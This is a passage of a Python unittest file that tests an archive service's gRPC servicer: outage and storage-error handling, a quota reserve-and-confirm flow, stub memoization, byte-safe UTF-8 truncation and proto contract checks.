        self.cache_set.assert_not_called()  # never cache the failed result

        joined = "\n".join(logs.output)
        self.assertIn("unavailable", joined)  # truthful cause
        self.assertNotIn("without the collection filter", joined)

        # Explicit deadline on the library call (2.9)
        self.assertEqual(
            stub.ListCollectionPageIds.call_args.kwargs.get("timeout"), _RPC_TIMEOUT
        )

    def test_unconfigured_library_is_unavailable(self):
        with patch("servicer._get_library_stub", return_value=None), \
             self.assertLogs("servicer", level="WARNING"):
            _, ctx = self._list(collection_id="c1")
        self.assertEqual(ctx._code, grpc.StatusCode.UNAVAILABLE)
        self.cache_set.assert_not_called()

    def test_healthy_library_serves_filtered_list(self):
        stub = MagicMock()
        stub.ListCollectionPageIds.return_value = (
            library_pb2.ListCollectionPageIdsResponse(page_ids=["p1"])
        )
        with patch("servicer._get_library_stub", return_value=stub):
            resp, ctx = self._list(collection_id="c1")
        self.assertIsNone(ctx._code)
        self.assertEqual([p.id for p in resp.pages], ["p1"])
        self.assertEqual(resp.total, 1)
        self.cache_set.assert_called_once()  # healthy results are still cached

    def test_unfiltered_list_unaffected_by_library_outage(self):
        with patch("servicer._get_library_stub", return_value=None):
            resp, ctx = self._list()
        self.assertIsNone(ctx._code)
        self.assertEqual(resp.total, 2)


# ---------------------------------------------------------------------------
# 2.13/design note f — R2 error classification
# ---------------------------------------------------------------------------

class TestR2ErrorClassification(unittest.TestCase):
    def _client_error(self, code, http=None):
        class ClientError(Exception):
            def __init__(self):
                super().__init__(
                    f"An error occurred ({code}) when calling the GetObject operation"
                )
                self.response = {
                    "Error": {"Code": code},
                    "ResponseMetadata": {"HTTPStatusCode": http or 400},
                }

        return ClientError()

    def test_missing_object_is_not_found(self):
        from servicer import _classify_r2_error
        self.assertEqual(
            _classify_r2_error(self._client_error("NoSuchKey", 404)),
            grpc.StatusCode.NOT_FOUND,
        )
        self.assertEqual(
            _classify_r2_error(self._client_error("404", 404)),
            grpc.StatusCode.NOT_FOUND,
        )
        self.assertEqual(
            _classify_r2_error(Exception("NoSuchKey")), grpc.StatusCode.NOT_FOUND
        )

    def test_overload_is_unavailable(self):
        from servicer import _classify_r2_error
        for exc in (
            self._client_error("SlowDown", 503),
            self._client_error("ServiceUnavailable", 503),
            self._client_error("", 503),
            Exception("SlowDown"),
        ):
            self.assertEqual(_classify_r2_error(exc), grpc.StatusCode.UNAVAILABLE, exc)

    def test_other_errors_are_internal(self):
        from servicer import _classify_r2_error
        self.assertEqual(
            _classify_r2_error(Exception("boom")), grpc.StatusCode.INTERNAL
        )
        self.assertEqual(
            _classify_r2_error(self._client_error("AccessDenied", 403)),
            grpc.StatusCode.INTERNAL,
        )

    def test_get_archive_file_slowdown_is_unavailable(self):
        """R2 throttling must surface UNAVAILABLE so the gateway's assets/
        fallback does NOT double-fetch or claim 'file not found'."""
        page = _make_page(page_id="p1", user_id="u1")
        mock_session = MagicMock()
        mock_session.execute.return_value.scalar_one_or_none.return_value = page
        mock_r2 = MagicMock()
        mock_r2.bucket = "b"
        mock_r2.client.get_object.side_effect = self._client_error("SlowDown", 503)

        with patch("servicer.R2Client", return_value=mock_r2), \
             patch("servicer.db_session") as mock_db_session, \
             patch("servicer.get_engine", return_value=MagicMock()):
            mock_db_session.return_value.__enter__ = lambda s: mock_session
            mock_db_session.return_value.__exit__ = lambda s, *a: None
            ctx = _FakeContext()
            ArchiveServicer().GetArchiveFile(
                archive_pb2.GetArchiveFileRequest(
                    page_id="p1", user_id="u1", file_path="index.html",
                ),
                ctx,
            )
        self.assertEqual(ctx._code, grpc.StatusCode.UNAVAILABLE)


# ---------------------------------------------------------------------------
# 2.14 — reserve-then-confirm flow against a real database
# ---------------------------------------------------------------------------

class TestQuotaReserveConfirmFlow(unittest.TestCase):
    def setUp(self):
        from sqlalchemy import create_engine as ce
        self.engine = ce("sqlite://")
        Base.metadata.create_all(self.engine)

    def _quota(self, user_id):
        """Return (pages_this_month, total_bytes) read inside a session —
        instances are expired on commit, so attributes must not be accessed
        after the session closes."""
        from models import UserQuota
        from sqlalchemy import select
        with db_session(self.engine) as session:
            q = session.execute(
                select(UserQuota).where(UserQuota.user_id == user_id)
            ).scalar_one()
            return q.pages_this_month, q.total_bytes

    def test_reserve_commit_then_confirm(self):
        from quota import confirm_quota, reserve_quota

        with db_session(self.engine) as session:
            self.assertIsNone(reserve_quota(session, "u1", "free", 1000))
        # Reservation is durable after the short reserve transaction.
        self.assertEqual(self._quota("u1"), (1, 1000))

        with db_session(self.engine) as session:
            self.assertIsNone(confirm_quota(session, "u1", "free", 1000))
        self.assertEqual(self._quota("u1"), (1, 1000))

    def test_confirm_refunds_when_concurrent_ingest_consumed_budget(self):
        from models import PLAN_LIMITS, UserQuota
        from quota import confirm_quota, reserve_quota
        from sqlalchemy import select

        limit = PLAN_LIMITS["free"]["pages_per_month"]
        with db_session(self.engine) as session:
            session.add(UserQuota(user_id="u1", pages_this_month=limit - 1,
                                  total_bytes=0,
                                  quota_reset_at=datetime.now(timezone.utc) + timedelta(days=30)))
        # Our reservation takes the count to the limit exactly.
        with db_session(self.engine) as session:
            self.assertIsNone(reserve_quota(session, "u1", "free", 1000))
        self.assertEqual(self._quota("u1"), (limit, 1000))  # reserved pre-concurrency

        # A concurrent ingest lands while this one "uploads", pushing the
        # count one past the limit (our reservation is part of the excess).
        with db_session(self.engine) as session:
            q = session.execute(
                select(UserQuota).where(UserQuota.user_id == "u1")
            ).scalar_one()
            q.pages_this_month = limit + 1

        with db_session(self.engine) as session:
            err = confirm_quota(session, "u1", "free", 1000)
        self.assertEqual(err, "exhausted:quota|Monthly page limit reached")
        self.assertEqual(self._quota("u1"), (limit, 1000))  # our +1 page refunded

    def test_reservation_committed_before_upload_phase(self):
        """The lock is never held across R2 uploads (design note e): a second
        connection sees the committed reservation while uploads run."""
        from models import UserQuota
        from quota import reserve_quota
        from sqlalchemy import create_engine as ce
        from sqlalchemy import select

        with tempfile.TemporaryDirectory(prefix="pp-archive-quota-") as tmp:
            eng = ce(f"sqlite:///{tmp}/quota.db")
            Base.metadata.create_all(eng)
            with db_session(eng) as session:
                self.assertIsNone(reserve_quota(session, "u1", "free", 1234))

            seen = {}

            def probe_upload(key, data, content_type=""):
                if key.endswith("index.html"):
                    with db_session(eng) as session:  # separate connection
                        q = session.execute(
                            select(UserQuota).where(UserQuota.user_id == "u1")
                        ).scalar_one()
                        seen["total_bytes"] = q.total_bytes  # read before close

            mock_r2 = MagicMock()
            mock_r2.upload.side_effect = probe_upload
            with patch("servicer.get_engine", return_value=eng), \
                 patch("servicer.R2Client", return_value=mock_r2), \
                 patch("servicer._get_search_stub", return_value=None):
                resp = ArchiveServicer().IngestPage(
                    _build_ingest_request(), _FakeContext()
                )
            self.assertTrue(resp.success)
            # The reservation was already committed when uploads executed:
            # 1234 (pre-seeded) + 31 (this ingest's html bytes).
            self.assertEqual(
                seen["total_bytes"],
                1234 + len(b"<html><body>Hello</body></html>"),
            )


# ---------------------------------------------------------------------------
# 2.10/D7 — memoized channel/stub pool
# ---------------------------------------------------------------------------

class TestStubPoolMemoization(unittest.TestCase):
    def setUp(self):
        import grpc_pool
        grpc_pool.reset_pool()
        self.addCleanup(grpc_pool.reset_pool)

    def test_channels_created_once_per_address(self):
        from servicer import _get_library_stub, _get_search_stub

        env = {
            "SEARCH_SERVICE_ADDR": "search:9999",
            "LIBRARY_SERVICE_ADDR": "library:9999",
            "MTLS_ENABLED": "false",
        }
        with patch.dict(os.environ, env), \
             patch("grpc.insecure_channel", return_value=MagicMock()) as mk_channel:
            s1 = _get_search_stub()
            s2 = _get_search_stub()
            l1 = _get_library_stub()

        self.assertIs(s1, s2)  # stub memoized per (factory, address)
        self.assertIsNot(s1, l1)
        self.assertEqual(mk_channel.call_count, 2)  # one per address, not per call

        # Channel options mirror the server-side message limits (gateway parity)
        opts = dict(mk_channel.call_args.kwargs["options"])
        self.assertEqual(
            opts["grpc.max_receive_message_length"], 256 * 1024 * 1024
        )

    def test_unconfigured_address_returns_none(self):
        from servicer import _get_share_stub
        env = {k: v for k, v in os.environ.items() if k != "SHARE_SERVICE_ADDR"}
        with patch.dict(os.environ, env, clear=True):
            self.assertIsNone(_get_share_stub())

    def test_pool_reset_drops_memoized_stubs(self):
        import grpc_pool
        from servicer import _get_search_stub

        env = {"SEARCH_SERVICE_ADDR": "search:9999", "MTLS_ENABLED": "false"}
        with patch.dict(os.environ, env), \
             patch("grpc.insecure_channel", return_value=MagicMock()) as mk_channel:
            _get_search_stub()
            grpc_pool.reset_pool()
            _get_search_stub()
        self.assertEqual(mk_channel.call_count, 2)  # channel rebuilt after reset


# ---------------------------------------------------------------------------
# 2.5/D7 — byte-safe truncation
# ---------------------------------------------------------------------------

class TestTruncateUtf8(unittest.TestCase):
    def test_short_text_untouched(self):
        from text_utils import truncate_utf8
        self.assertEqual(truncate_utf8("hello", 100), "hello")

    def test_ascii_truncated_by_bytes(self):
        from text_utils import truncate_utf8
        self.assertEqual(truncate_utf8("a" * 100, 10), "a" * 10)

    def test_cjk_truncated_by_bytes_not_chars(self):
        from text_utils import truncate_utf8
        text = "漢" * 100  # 300 UTF-8 bytes
        out = truncate_utf8(text, 100)
        self.assertLessEqual(len(out.encode("utf-8")), 100)
        self.assertEqual(len(out), 33)  # 33 chars × 3 bytes = 99 ≤ 100 < 102

    def test_split_multibyte_sequence_dropped_cleanly(self):
        from text_utils import truncate_utf8
        out = truncate_utf8("漢漢漢", 4)  # byte 4 splits the second char
        self.assertEqual(out, "漢")
        out.encode("utf-8")  # valid UTF-8 — no dangling partial sequence

    def test_no_replacement_characters(self):
        from text_utils import truncate_utf8
        out = truncate_utf8("é" * 50, 10)  # 2-byte chars → 5 fit exactly
        self.assertNotIn("\ufffd", out)
        self.assertEqual(out, "é" * 5)

    def test_default_limit_is_mediumtext_minus_headroom(self):
        import inspect

        import text_utils
        default = inspect.signature(text_utils.truncate_utf8).parameters["limit_bytes"].default
        self.assertEqual(default, 16 * 1024 * 1024 - 4096)
        self.assertEqual(
            text_utils.truncate_utf8("a" * (16 * 1024 * 1024 + 1)),
            "a" * (16 * 1024 * 1024 - 4096),
        )


class TestIndexPageBodyTruncation(unittest.TestCase):
    """2.5: body_text sent to search is truncated by BYTES (a character slice
    overflows MEDIUMTEXT for CJK and splits multi-byte sequences)."""

    def _ingest_and_capture_body(self, html, limit):
        stub = MagicMock()
        mock_session = MagicMock()
        mock_session.execute.return_value.scalar_one_or_none.return_value = None
        with patch("servicer._get_search_stub", return_value=stub), \
             patch("servicer._SEARCH_BODY_LIMIT_BYTES", limit), \
             patch("servicer.R2Client"), \
             patch("servicer.db_session") as mock_db_session, \
             patch("servicer.reserve_quota", return_value=None), \
             patch("servicer.confirm_quota", return_value=None), \
             patch("servicer.get_engine", return_value=MagicMock()):
            mock_db_session.return_value.__enter__ = lambda s: mock_session
            mock_db_session.return_value.__exit__ = lambda s, *a: None
            resp = ArchiveServicer().IngestPage(
                _build_ingest_request(html_content=html), _FakeContext()
            )
        return resp, stub

    def test_sent_body_is_byte_truncated_and_valid_utf8(self):
        body = "漢" * 500  # 1500 UTF-8 bytes
        html = f"<html><body>{body}</body></html>".encode()
        resp, stub = self._ingest_and_capture_body(html, limit=64)
        self.assertTrue(resp.success)
        sent = stub.IndexPage.call_args.args[0]
        self.assertLessEqual(len(sent.body_text.encode("utf-8")), 64)
        sent.body_text.encode("utf-8")  # decodes cleanly — no split sequence
        self.assertEqual(len(sent.body_text), 21)  # 21×3=63 ≤ 64 < 22×3

    def test_default_limit_constant_matches_mediumtext(self):
        from servicer import _SEARCH_BODY_LIMIT_BYTES
        self.assertEqual(_SEARCH_BODY_LIMIT_BYTES, 16 * 1024 * 1024 - 4096)


# ---------------------------------------------------------------------------
# 5.1-5.5 — proto contract guarantees
# ---------------------------------------------------------------------------

class TestProtoContracts(unittest.TestCase):
    def test_presigned_and_storage_fields_reserved(self):
        self.assertFalse(hasattr(archive_pb2.PageResponse(), "r2_key"))
        self.assertFalse(hasattr(archive_pb2.PageContentResponse(), "signed_url"))
        self.assertEqual(
            [f.name for f in archive_pb2.PageContentResponse.DESCRIPTOR.fields],
            ["expires_at"],
        )

    def test_plan_field_marked_deprecated(self):
        field = archive_pb2.IngestPageRequest.DESCRIPTOR.fields_by_name["plan"]
        self.assertTrue(field.GetOptions().deprecated)

    def test_status_response_deduplicated(self):
        import auth_pb2
        import common_pb2
        import library_pb2
        import search_pb2
        import share_pb2
        for mod in (archive_pb2, auth_pb2, library_pb2, search_pb2, share_pb2):
            self.assertFalse(hasattr(mod, "StatusResponse"))
        fields = common_pb2.StatusResponse.DESCRIPTOR.fields_by_name
        self.assertEqual(fields["success"].number, 1)
        self.assertEqual(fields["success"].type, fields["success"].TYPE_BOOL)
        self.assertEqual(fields["message"].number, 2)
        self.assertEqual(fields["message"].type, fields["message"].TYPE_STRING)

    def test_new_rpc_request_shapes(self):
        import library_pb2
        import share_pb2
        self.assertEqual(
            [f.name for f in library_pb2.PurgePageLinksRequest.DESCRIPTOR.fields],
            ["page_id"],
        )
        self.assertEqual(
            [f.name for f in share_pb2.RevokeLinksForPageRequest.DESCRIPTOR.fields],
            ["page_id"],
        )

    def test_get_page_content_owner_receives_no_url(self):
        """D4: even a successful, ownership-verified call returns no presigned
        URL — delivery is exclusively via the sandboxed asset routes."""
        page = _make_page(page_id="p1", user_id="u1")
        mock_session = MagicMock()
        mock_session.execute.return_value.scalar_one_or_none.return_value = page
        mock_r2 = MagicMock()

        with patch("servicer.R2Client", return_value=mock_r2), \
             patch("servicer.db_session") as mock_db_session, \
             patch("servicer.get_engine", return_value=MagicMock()):
            mock_db_session.return_value.__enter__ = lambda s: mock_session
            mock_db_session.return_value.__exit__ = lambda s, *a: None
            ctx = _FakeContext()
            resp = ArchiveServicer().GetPageContent(
                archive_pb2.GetPageContentRequest(page_id="p1", user_id="u1"), ctx
            )
        self.assertIsNone(ctx._code)
        mock_r2.presign.assert_not_called()
        self.assertFalse(hasattr(resp, "signed_url"))


# ---------------------------------------------------------------------------
# 5.1 follow-on — stale cache entries carrying the removed r2_key must not
# break GetPage/ListPages (graceful field filtering).
# ---------------------------------------------------------------------------

class TestStaleCacheEntryTolerance(unittest.TestCase):
    def test_cached_page_with_removed_r2_key_still_served(self):
        cached = {
            "id": "p1", "user_id": "u1", "url": "https://example.com",
            "title": "Test", "preview_text": "preview",
            "r2_key": "u1/p1/index.html",  # removed field, still in old entries
            "size_bytes": 1000, "extension_job_id": "job1",
            "archived_at": datetime.now(timezone.utc).isoformat(),
        }
        with patch("servicer.cache_get", return_value=cached), \
             patch("servicer.R2Client"), \
             patch("servicer.get_engine", return_value=MagicMock()):
            ctx = _FakeContext()
            resp = ArchiveServicer().GetPage(
                archive_pb2.GetPageRequest(page_id="p1", user_id="u1"), ctx
            )
        self.assertIsNone(ctx._code)
        self.assertEqual(resp.id, "p1")
        self.assertFalse(hasattr(resp, "r2_key"))


if __name__ == "__main__":
    unittest.main()
